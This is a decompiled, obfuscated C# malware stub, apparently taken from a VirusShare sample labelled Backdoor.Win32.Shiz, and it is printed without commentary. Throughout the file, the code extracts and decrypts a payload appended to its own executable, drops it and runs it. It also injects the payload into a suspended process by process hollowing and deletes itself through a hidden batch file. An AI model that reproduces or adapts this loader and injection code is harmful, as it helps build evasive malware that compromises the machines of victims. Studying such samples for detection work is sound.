// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Qstub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=dd0e6adf76ed4a71
// MVID: 45AE1CDB-6F3F-421C-8CA1-13232795BB5F
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.Win32.Shiz.hprn-62e1204ec8cae7db44d162f50abc095675248dd4a573b819206b95620860dd86.exe

using \u0004;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace \u0004
{
  internal class \u0004 : Form
  {
    private IContainer \u0001;
    private System.Windows.Forms.Timer \u0001;
    private string[] \u0001;
    private string \u0001;
    private string \u0002;
    private string \u0003;
    private string \u0004;
    private string \u0005;
    private string \u0006;
    private string \u0007;
    private string \u0008;
    private string \u000E;
    private string \u000F;

    public \u0004()
    {
      \u008C\u0003 obj1 = \u008C\u0003.\u0005\u0005;
      \u0004.\u0004 obj2 = this;
      // ISSUE: virtual method pointer
      EventHandler eventHandler = new EventHandler((object) obj2, __vmethodptr(obj2, \u0003));
      obj1((object) this, eventHandler);
      this.\u000F = \u0099\u0003.\u0086\u0002(\u009A\u0002.\u007E\u0093((object) \u000E\u0003.\u007E\u0091((object) \u0095\u0002.\u007E\u001B((object) \u0001.\u0003()))), "\\", \u009D\u0002.\u0083(this.\u0003(1, 1000000)), ".exe");
      this.\u0003();
    }

    [DebuggerNonUserCode]
    protected override void Dispose([In] bool obj0)
    {
      try
      {
        if (!obj0 || this.\u0001 == null)
          return;
        \u0082\u0002.\u007E\u0016\u0002((object) this.\u0001);
      }
      finally
      {
        \u0008\u0004.\u0007\u0005((object) this, obj0);
      }
    }

    private void \u0003()
    {
      this.\u0001 = (IContainer) new System.ComponentModel.Container();
      this.\u0003(new System.Windows.Forms.Timer(this.\u0001));
      \u0082\u0002.\u007E\u009B\u0004((object) this);
      \u001E\u0003.\u007E\u009C\u0004((object) this, new SizeF(6f, 13f));
      \u0015\u0003.\u007E\u009D\u0004((object) this, AutoScaleMode.Font);
      \u007F\u0003.\u007E\u0001\u0005((object) this, new Size(10, 10));
      \u0087\u0002.\u007E\u009F\u0004((object) this, FormBorderStyle.None);
      \u0093\u0002.\u007E\u0099\u0004((object) this, "Form1");
      \u0008\u0004.\u007E\u0003\u0005((object) this, false);
      \u0008\u0004.\u007E\u0002\u0005((object) this, false);
      \u0093\u0002.\u007E\u0004\u0005((object) this, "Form1");
      \u0008\u0004.\u007E\u009A\u0004((object) this, false);
    }

    [DebuggerNonUserCode]
    [SpecialName]
    internal virtual System.Windows.Forms.Timer \u0003() => this.\u0001;

    [DebuggerNonUserCode]
    [SpecialName]
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void \u0003([In] System.Windows.Forms.Timer obj0)
    {
      \u0004.\u0004 obj = this;
      // ISSUE: virtual method pointer
      EventHandler eventHandler = new EventHandler((object) obj, __vmethodptr(obj, \u0004));
      if (this.\u0001 != null)
        \u008C\u0003.\u007E\u000F\u0005((object) this.\u0001, eventHandler);
      this.\u0001 = obj0;
      if (this.\u0001 == null)
        return;
      \u008C\u0003.\u007E\u000E\u0005((object) this.\u0001, eventHandler);
    }

    private void \u0003([In] object obj0, [In] EventArgs obj1)
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num2 = -2;
label_1:
        int num3 = 2;
        FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared);
label_2:
        num3 = 3;
        this.\u0002 = Strings.Space(checked ((int) FileSystem.LOF(1)));
label_3:
        num3 = 4;
        this.\u0003 = Strings.Space(checked ((int) FileSystem.LOF(1)));
label_4:
        num3 = 5;
        this.\u0004 = Strings.Space(checked ((int) FileSystem.LOF(1)));
label_5:
        num3 = 6;
        this.\u0005 = Strings.Space(checked ((int) FileSystem.LOF(1)));
label_6:
        num3 = 7;
        this.\u0006 = Strings.Space(checked ((int) FileSystem.LOF(1)));
label_7:
        num3 = 8;
        this.\u0007 = Strings.Space(checked ((int) FileSystem.LOF(1)));
label_8:
        num3 = 9;
        this.\u0008 = Strings.Space(checked ((int) FileSystem.LOF(1)));
label_9:
        num3 = 10;
        this.\u000E = Strings.Space(checked ((int) FileSystem.LOF(1)));
label_10:
        num3 = 11;
        FileSystem.FileGet(1, ref this.\u0002);
label_11:
        num3 = 12;
        FileSystem.FileGet(1, ref this.\u0003);
label_12:
        num3 = 13;
        FileSystem.FileGet(1, ref this.\u0004);
label_13:
        num3 = 14;
        FileSystem.FileGet(1, ref this.\u0005);
label_14:
        num3 = 15;
        FileSystem.FileGet(1, ref this.\u0006);
label_15:
        num3 = 16;
        FileSystem.FileGet(1, ref this.\u0007);
label_16:
        num3 = 17;
        FileSystem.FileGet(1, ref this.\u0008);
label_17:
        num3 = 18;
        FileSystem.FileGet(1, ref this.\u000E);
label_18:
        num3 = 19;
        this.\u0001 = Strings.Split(this.\u0002, "FUCK@I@OWN@THIS@SHIZ!@†FENIMIN†@");
label_19:
        num3 = 20;
        FileSystem.FileClose(1);
label_20:
        num3 = 21;
        this.\u0003().Start();
label_21:
        num3 = 22;
        this.\u0001 = \u0003.\u0003(this.\u0001[1], this.\u0001[8]);
label_22:
        num3 = 23;
        FileSystem.FileOpen(5, this.\u000F, OpenMode.Binary, OpenAccess.ReadWrite);
label_23:
        num3 = 24;
        FileSystem.FilePut(5, this.\u0001, -1L, false);
label_24:
        num3 = 25;
        FileSystem.FileClose(5);
label_25:
        num3 = 26;
        this.\u0003(Conversions.ToLong(this.\u000F));
label_26:
        num3 = 27;
        this.\u0003(\u0001.\u0003().FileSystem.ReadAllBytes(this.\u000F), Environment.UserName.ToString());
label_27:
        num3 = 28;
        this.\u0003(Conversions.ToLong(this.\u000F));
label_28:
        num3 = 29;
        Interaction.Shell(this.\u000F);
label_29:
        num3 = 30;
        if (!Conversions.ToBoolean(this.\u0001[7]))
          goto label_32;
label_30:
        num3 = 31;
        Thread.Sleep(30000);
label_31:
        num3 = 32;
        this.\u0004();
label_32:
        num3 = 34;
        this.Close();
        ProjectData.EndApp();
        goto label_39;
label_34:
        num1 = num3;
        switch (num2 > -2 ? num2 : 1)
        {
          case 1:
            int num4 = num1 + 1;
            num1 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
                goto label_11;
              case 13:
                goto label_12;
              case 14:
                goto label_13;
              case 15:
                goto label_14;
              case 16:
                goto label_15;
              case 17:
                goto label_16;
              case 18:
                goto label_17;
              case 19:
                goto label_18;
              case 20:
                goto label_19;
              case 21:
                goto label_20;
              case 22:
                goto label_21;
              case 23:
                goto label_22;
              case 24:
                goto label_23;
              case 25:
                goto label_24;
              case 26:
                goto label_25;
              case 27:
                goto label_26;
              case 28:
                goto label_27;
              case 29:
                goto label_28;
              case 30:
                goto label_29;
              case 31:
                goto label_30;
              case 32:
                goto label_31;
              case 33:
              case 34:
                goto label_32;
              case 35:
                goto label_39;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num2 != 0 & num1 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_34;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_39:
      if (num1 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private int \u0003([In] int obj0, [In] int obj1)
    {
      Random random = new Random();
      return \u0011\u0003.\u007E\u0016\u0003((object) random, obj0, obj1);
    }

    public void \u0004()
    {
      try
      {
        StreamWriter streamWriter = new StreamWriter(\u0001\u0004.\u0083\u0002(\u0004\u0004.\u001C\u0004(), "\\mUpdate.bat"));
        \u0093\u0002.\u007E\u001D\u0004((object) streamWriter, "@echo off");
        \u0093\u0002.\u007E\u001D\u0004((object) streamWriter, \u0001\u0004.\u0083\u0002("TASKKILL /F /T /IM ", \u0004\u0004.\u0094\u0004()));
        \u0093\u0002.\u007E\u001D\u0004((object) streamWriter, \u0001\u0004.\u0083\u0002("del ", \u0086\u0003.\u0098(\u0004\u0004.\u0093\u0004(), \u0001\u0004.\u0083\u0002(\u0004\u0004.\u0095\u0004(), "\\"), "", 1, -1, CompareMethod.Binary)));
        \u0093\u0002.\u007E\u001D\u0004((object) streamWriter, "del mUpdate.bat");
        \u0082\u0002.\u007E\u007F\u0004((object) streamWriter);
        \u0082\u0002.\u007E\u001F\u0004((object) streamWriter);
        int num = \u008A\u0002.\u008F(\u0001\u0004.\u0083\u0002(\u0004\u0004.\u001C\u0004(), "\\mUpdate.bat"), AppWinStyle.Hide, false, -1);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u0088\u0003.\u008C();
      }
    }

    private void \u0004([In] object obj0, [In] EventArgs obj1)
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num2 = -2;
label_1:
        int num3 = 2;
        this.\u0003(Conversions.ToLong(this.\u000F));
label_2:
        num3 = 3;
        if (!Conversions.ToBoolean(this.\u0001[2]))
          goto label_4;
label_3:
        num3 = 4;
        \u0002.\u0003();
        goto label_5;
label_4:
        num3 = 6;
label_5:
        num3 = 8;
        if (!Conversions.ToBoolean(this.\u0001[3]))
          goto label_7;
label_6:
        num3 = 9;
        \u0002.\u0004();
        goto label_8;
label_7:
        num3 = 11;
label_8:
        num3 = 13;
        if (!Conversions.ToBoolean(this.\u0001[4]))
          goto label_10;
label_9:
        num3 = 14;
        \u0002.\u0005();
        goto label_11;
label_10:
        num3 = 16;
label_11:
        num3 = 18;
        if (!Conversions.ToBoolean(this.\u0001[5]))
          goto label_13;
label_12:
        num3 = 19;
        \u0002.\u0004();
        goto label_14;
label_13:
        num3 = 21;
label_14:
        num3 = 23;
        if (!Conversions.ToBoolean(this.\u0001[6]))
          goto label_16;
label_15:
        num3 = 24;
        \u0002.\u0003();
        goto label_23;
label_16:
        goto label_23;
label_18:
        num1 = num3;
        switch (num2 > -2 ? num2 : 1)
        {
          case 1:
            int num4 = num1 + 1;
            num1 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
              case 7:
              case 8:
                goto label_5;
              case 6:
                goto label_4;
              case 9:
                goto label_6;
              case 10:
              case 12:
              case 13:
                goto label_8;
              case 11:
                goto label_7;
              case 14:
                goto label_9;
              case 15:
              case 17:
              case 18:
                goto label_11;
              case 16:
                goto label_10;
              case 19:
                goto label_12;
              case 20:
              case 22:
              case 23:
                goto label_14;
              case 21:
                goto label_13;
              case 24:
                goto label_15;
              case 25:
              case 27:
              case 28:
                goto label_23;
              case 26:
                goto label_16;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num2 != 0 & num1 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_18;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_23:
      if (num1 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private uint \u0003([In] IntPtr obj0)
    {
      uint num;
      return num;
    }

    private bool \u0003([In] IntPtr obj0, [In] ref \u0004.\u0004.\u0006 obj1)
    {
      bool flag;
      return flag;
    }

    private bool \u0004([In] IntPtr obj0, [In] ref \u0004.\u0004.\u0006 obj1)
    {
      bool flag;
      return flag;
    }

    private bool \u0003(
      [In] string obj0,
      [In] string obj1,
      [In] ref \u0004.\u0004.\u0004 obj2,
      [In] ref \u0004.\u0004.\u0004 obj3,
      [In] bool obj4,
      [In] uint obj5,
      [In] IntPtr obj6,
      [In] string obj7,
      [In] ref \u0004.\u0004.\u0001 lpStartupInfo,
      out \u0004.\u0004.\u0002 lpProcessInformation)
    {
      bool flag;
      return flag;
    }

    public bool \u0003(
      [In] IntPtr obj0,
      [In] IntPtr obj1,
      [In] byte[] obj2,
      [In] int obj3,
      out int lpNumberOfBytesWritten)
    {
      bool flag;
      return flag;
    }

    public int \u0003([In] IntPtr obj0, [In] int obj1, [In] ref IntPtr obj2, [In] int obj3, [In] ref int obj4)
    {
      int num;
      return num;
    }

    public long \u0003([In] IntPtr obj0, [In] IntPtr obj1)
    {
      long num;
      return num;
    }

    public IntPtr \u0003([In] IntPtr obj0, [In] IntPtr obj1, [In] uint obj2, [In] uint obj3, [In] uint obj4)
    {
      IntPtr num;
      return num;
    }

    public int \u0003([In] IntPtr obj0, [In] IntPtr obj1, [In] UIntPtr obj2, [In] UIntPtr obj3, [Out] uint lpflOldProtect)
    {
      int num;
      return num;
    }

    public void \u0003([In] byte[] obj0, [In] string obj1)
    {
      \u0004.\u0004.\u0006 obj2 = new \u0004.\u0004.\u0006();
      \u0004.\u0004.\u0002 lpProcessInformation = new \u0004.\u0004.\u0002();
      \u0004.\u0004.\u0001 lpStartupInfo = new \u0004.\u0004.\u0001();
      \u0004.\u0004.\u0004 obj3 = new \u0004.\u0004.\u0004();
      \u0004.\u0004.\u0004 obj4 = new \u0004.\u0004.\u0004();
      GCHandle gcHandle = \u0095\u0003.\u0007\u0004((object) obj0, GCHandleType.Pinned);
      IntPtr num1 = gcHandle.AddrOfPinnedObject();
      int int32 = num1.ToInt32();
      \u0004.\u0004.\u0003 obj5;
      object obj6 = \u0097\u0003.\u000F\u0004(gcHandle.AddrOfPinnedObject(), \u0012\u0002.\u007E\u0011\u0002((object) obj5));
      \u0004.\u0004.\u0003 obj7;
      \u0004.\u0004.\u0003 obj8 = obj6 != null ? (\u0004.\u0004.\u0003) obj6 : obj7;
      gcHandle.Free();
      IntPtr num2;
      if (-(this.\u0003((string) null, obj1, ref obj3, ref obj4, false, 4U, num2, (string) null, ref lpStartupInfo, out lpProcessInformation) ? 1 : 0) == 0)
        return;
      num1 = new IntPtr(checked (int32 + obj8.\u0001));
      \u0004.\u0004.\u000F obj9;
      object obj10 = \u0097\u0003.\u000F\u0004(num1, \u0012\u0002.\u007E\u0011\u0002((object) obj9));
      \u0004.\u0004.\u000F obj11;
      \u0004.\u0004.\u000F obj12 = obj10 != null ? (\u0004.\u0004.\u000F) obj10 : obj11;
      lpStartupInfo.\u0001 = \u0003\u0002.\u0097((object) lpStartupInfo);
      obj2.\u0001 = 65538U;
      if (obj12.\u0001 != 17744U | obj8.\u0001 != (ushort) 23117)
        return;
      int num3 = this.\u0003(lpProcessInformation.\u0002, ref obj2) ? 1 : 0;
      IntPtr num4 = lpProcessInformation.\u0001;
      int num5 = checked ((int) ((long) obj2.\u0013 + 8L));
      long num6;
      num1 = \u0091\u0003.\u0005\u0003(num6);
      ref IntPtr local1 = ref num1;
      int num7 = 0;
      ref int local2 = ref num7;
      int num8 = this.\u0003(num4, num5, ref local1, 4, ref local2);
      long lpflOldProtect = \u0006\u0003.\u0007\u0003(num1);
      int num9 = num8 >= 0 ? 1 : 0;
      if ((num3 & num9 & (this.\u0003(lpProcessInformation.\u0001, \u0091\u0003.\u0005\u0003(lpflOldProtect)) >= 0L ? 1 : 0)) == 0)
        return;
      uint num10 = checked ((uint) \u000E\u0002.\u0006\u0003(this.\u0003(lpProcessInformation.\u0001, \u0091\u0003.\u0005\u0003((long) obj12.\u0001.\u0007), obj12.\u0001.\u0010, 12288U, 4U)));
      if (num10 == 0U)
        return;
      IntPtr num11 = lpProcessInformation.\u0001;
      IntPtr num12 = \u0091\u0003.\u0005\u0003((long) num10);
      byte[] numArray1 = obj0;
      int num13 = checked ((int) obj12.\u0001.\u0011);
      uint num14;
      int num15 = checked ((int) num14);
      ref int local3 = ref num15;
      this.\u0003(num11, num12, numArray1, num13, out local3);
      uint num16 = checked ((uint) num15);
      long num17 = (long) checked (obj8.\u0001 + 248);
      int num18 = checked ((int) obj12.\u0001.\u0002 - 1);
      int num19 = 0;
      while (num19 <= num18)
      {
        num1 = new IntPtr(checked ((long) int32 + num17 + (long) (num19 * 40)));
        \u0004.\u0004.\u0011 obj13;
        object obj14 = \u0097\u0003.\u000F\u0004(num1, \u0012\u0002.\u007E\u0011\u0002((object) obj13));
        \u0004.\u0004.\u0011 obj15;
        obj13 = obj14 != null ? (\u0004.\u0004.\u0011) obj14 : obj15;
        byte[] numArray2 = new byte[checked ((int) obj13.\u0002 + 1)];
        int num20 = checked ((int) ((long) obj13.\u0002 - 1L));
        int index = 0;
        while (index <= num20)
        {
          numArray2[index] = obj0[checked ((int) ((long) obj13.\u0003 + (long) index))];
          checked { ++index; }
        }
        IntPtr num21 = lpProcessInformation.\u0001;
        IntPtr num22 = \u0091\u0003.\u0005\u0003((long) checked (num10 + obj13.\u0001));
        byte[] numArray3 = numArray2;
        int num23 = checked ((int) obj13.\u0002);
        num15 = checked ((int) num16);
        ref int local4 = ref num15;
        this.\u0003(num21, num22, numArray3, num23, out local4);
        num16 = checked ((uint) num15);
        this.\u0003(lpProcessInformation.\u0001, \u0091\u0003.\u0005\u0003((long) checked (num10 + obj13.\u0001)), \u009F.\u001C\u0003(obj13.\u0001.\u0002), \u0017\u0002.\u001D\u0003(checked ((ulong) this.\u0003((long) obj13.\u0006))), checked ((uint) lpflOldProtect));
        checked { ++num19; }
      }
      byte[] numArray4 = \u009B\u0002.\u009A\u0002(num10);
      IntPtr num24 = lpProcessInformation.\u0001;
      IntPtr num25 = \u0091\u0003.\u0005\u0003(checked ((long) obj2.\u0013 + 8L));
      byte[] numArray5 = numArray4;
      num15 = checked ((int) num16);
      ref int local5 = ref num15;
      this.\u0003(num24, num25, numArray5, 4, out local5);
      num14 = checked ((uint) num15);
      obj2.\u0016 = checked (num10 + obj12.\u0001.\u0004);
      this.\u0004(lpProcessInformation.\u0002, ref obj2);
      int num26 = (int) this.\u0003(lpProcessInformation.\u0002);
    }

    private long \u0003([In] long obj0)
    {
      object[] objArray = new object[8]
      {
        (object) 1L,
        (object) 16L,
        (object) 2U,
        (object) 32L,
        (object) 4L,
        (object) 64L,
        (object) 4L,
        (object) 64L
      };
      return \u009F\u0002.\u0082(objArray[checked ((int) this.\u0003(obj0, 29L))]);
    }

    private long \u0003([In] long obj0, [In] long obj1) => checked ((long) \u0004\u0002.\u0010\u0003(unchecked (this.\u0003(obj0) / \u0006\u0004.\u0011\u0003(2.0, (double) obj1))));

    private double \u0003([In] long obj0) => obj0 >= 0L ? (double) obj0 : (double) obj0 + 4294967296.0;

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    internal struct \u0001
    {
      public int \u0001;
      public string \u0001;
      public string \u0002;
      public string \u0003;
      public int \u0002;
      public int \u0003;
      public int \u0004;
      public int \u0005;
      public int \u0006;
      public int \u0007;
      public int \u0008;
      public int \u000E;
      public short \u0001;
      public short \u0002;
      public int \u000F;
      public int \u0010;
      public int \u0011;
      public int \u0012;
    }

    private struct \u0002
    {
      public IntPtr \u0001;
      public IntPtr \u0002;
      public int \u0001;
      public int \u0002;
    }

    private struct \u0003
    {
      public ushort \u0001;
      public ushort \u0002;
      public ushort \u0003;
      public ushort \u0004;
      public ushort \u0005;
      public ushort \u0006;
      public ushort \u0007;
      public ushort \u0008;
      public ushort \u000E;
      public ushort \u000F;
      public ushort \u0010;
      public ushort \u0011;
      public ushort \u0012;
      public ushort \u0013;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
      public ushort[] \u0001;
      public ushort \u0014;
      public ushort \u0015;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
      public ushort[] \u0002;
      public int \u0001;
    }

    internal struct \u0004
    {
      public int \u0001;
      public IntPtr \u0001;
      public int \u0002;
    }

    internal struct \u0005
    {
      public uint \u0001;
      public uint \u0002;
      public uint \u0003;
      public uint \u0004;
      public uint \u0005;
      public uint \u0006;
      public uint \u0007;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
      public byte[] \u0001;
      public uint \u0008;
    }

    internal struct \u0006
    {
      public uint \u0001;
      public uint \u0002;
      public uint \u0003;
      public uint \u0004;
      public uint \u0005;
      public uint \u0006;
      public uint \u0007;
      public \u0004.\u0004.\u0005 \u0001;
      public uint \u0008;
      public uint \u000E;
      public uint \u000F;
      public uint \u0010;
      public uint \u0011;
      public uint \u0012;
      public uint \u0013;
      public uint \u0014;
      public uint \u0015;
      public uint \u0016;
      public uint \u0017;
      public uint \u0018;
      public uint \u0019;
      public uint \u001A;
      public uint \u001B;
      public uint \u001C;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
      public byte[] \u0001;
    }

    internal struct \u0007
    {
      public ushort \u0001;
      public byte \u0001;
      public byte \u0002;
      public uint \u0001;
      public uint \u0002;
      public uint \u0003;
      public uint \u0004;
      public uint \u0005;
      public uint \u0006;
      public uint \u0007;
      public uint \u0008;
      public uint \u000E;
      public ushort \u0002;
      public ushort \u0003;
      public ushort \u0004;
      public ushort \u0005;
      public ushort \u0006;
      public ushort \u0007;
      public uint \u000F;
      public uint \u0010;
      public uint \u0011;
      public uint \u0012;
      public ushort \u0008;
      public ushort \u000E;
      public uint \u0013;
      public uint \u0014;
      public uint \u0015;
      public uint \u0016;
      public uint \u0017;
      public uint \u0018;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
      public \u0004.\u0004.\u000E[] \u0001;
    }

    internal struct \u0008
    {
      public ushort \u0001;
      public ushort \u0002;
      public uint \u0001;
      public uint \u0002;
      public uint \u0003;
      public ushort \u0003;
      public ushort \u0004;
    }

    internal struct \u000E
    {
      public uint \u0001;
      public uint \u0002;
    }

    internal struct \u000F
    {
      public uint \u0001;
      public \u0004.\u0004.\u0008 \u0001;
      public \u0004.\u0004.\u0007 \u0001;
    }

    internal struct \u0010
    {
      public uint \u0001;
      public uint \u0002;
    }

    internal struct \u0011
    {
      public byte \u0001;
      public \u0004.\u0004.\u0010 \u0001;
      public uint \u0001;
      public uint \u0002;
      public uint \u0003;
      public uint \u0004;
      public uint \u0005;
      public ushort \u0001;
      public ushort \u0002;
      public uint \u0006;
    }
  }
}
